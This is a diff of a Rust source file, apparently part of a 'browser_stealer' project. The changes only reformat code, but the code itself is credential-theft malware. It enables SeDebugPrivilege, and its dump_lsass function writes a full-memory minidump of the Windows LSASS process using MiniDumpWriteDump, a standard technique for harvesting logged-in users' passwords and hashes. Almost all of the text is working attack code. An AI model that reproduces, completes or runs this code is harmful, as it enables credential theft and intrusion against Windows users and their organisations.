@@ -10,9 +10,7 @@
 
 use std::ffi::c_void;
 
-use crate::browser_stealer::browser_ffi::{
-    self, PROCESSENTRY32W, TOKEN_PRIVILEGES,
-};
+use crate::browser_stealer::browser_ffi::{self, PROCESSENTRY32W, TOKEN_PRIVILEGES};
 
 const PROCESS_ALL_ACCESS: u32 = 0x001F_0FFF;
 const TOKEN_ADJUST_PRIVILEGES: u32 = 0x0020;
@@ -27,16 +25,26 @@ const INVALID_HANDLE: isize = -1;
 #[link(name = "kernel32")]
 extern "system" {
     fn CreateFileW(
-        name: *const u16, access: u32, share: u32, sec: *mut c_void,
-        disp: u32, flags: u32, tmpl: *mut c_void,
+        name: *const u16,
+        access: u32,
+        share: u32,
+        sec: *mut c_void,
+        disp: u32,
+        flags: u32,
+        tmpl: *mut c_void,
     ) -> isize;
 }
 
 #[link(name = "dbghelp")]
 extern "system" {
     fn MiniDumpWriteDump(
-        process: isize, pid: u32, file: isize, kind: u32,
-        exc: *mut c_void, user: *mut c_void, callback: *mut c_void,
+        process: isize,
+        pid: u32,
+        file: isize,
+        kind: u32,
+        exc: *mut c_void,
+        user: *mut c_void,
+        callback: *mut c_void,
     ) -> i32;
 }
 
@@ -47,16 +55,29 @@ fn wide(s: &str) -> Vec<u16> {
 /// 提 SeDebugPrivilege。
 unsafe fn enable_se_debug() {
     let mut token: isize = 0;
-    if browser_ffi::OpenProcessToken(browser_ffi::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut token) == 0 {
+    if browser_ffi::OpenProcessToken(
+        browser_ffi::GetCurrentProcess(),
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+        &mut token,
+    ) == 0
+    {
         return;
     }
     let name = wide("SeDebugPrivilege");
     let mut luid: i64 = 0;
     if browser_ffi::LookupPrivilegeValueW(std::ptr::null(), name.as_ptr(), &mut luid) != 0 {
-        let tp = TOKEN_PRIVILEGES { PrivilegeCount: 1, Luid: luid, Attributes: SE_PRIVILEGE_ENABLED };
+        let tp = TOKEN_PRIVILEGES {
+            PrivilegeCount: 1,
+            Luid: luid,
+            Attributes: SE_PRIVILEGE_ENABLED,
+        };
         let _ = browser_ffi::AdjustTokenPrivileges(
-            token, 0, &tp as *const TOKEN_PRIVILEGES, std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
-            std::ptr::null_mut(), std::ptr::null_mut(),
+            token,
+            0,
+            &tp as *const TOKEN_PRIVILEGES,
+            std::mem::size_of::<TOKEN_PRIVILEGES>() as u32,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
         );
     }
     browser_ffi::CloseHandle(token);
@@ -106,7 +127,13 @@ pub fn dump_lsass(dump_path: &str) -> String {
 
         let path_w = wide(dump_path);
         let file = CreateFileW(
-            path_w.as_ptr(), GENERIC_WRITE, 0, std::ptr::null_mut(), CREATE_ALWAYS, 0, std::ptr::null_mut(),
+            path_w.as_ptr(),
+            GENERIC_WRITE,
+            0,
+            std::ptr::null_mut(),
+            CREATE_ALWAYS,
+            0,
+            std::ptr::null_mut(),
         );
         if file == INVALID_HANDLE {
             browser_ffi::CloseHandle(process);
@@ -114,8 +141,13 @@ pub fn dump_lsass(dump_path: &str) -> String {
         }
 
         let ok = MiniDumpWriteDump(
-            process, pid, file, MINIDUMP_WITH_FULL_MEMORY,
-            std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
+            process,
+            pid,
+            file,
+            MINIDUMP_WITH_FULL_MEMORY,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
         );
         browser_ffi::CloseHandle(file);
         browser_ffi::CloseHandle(process);
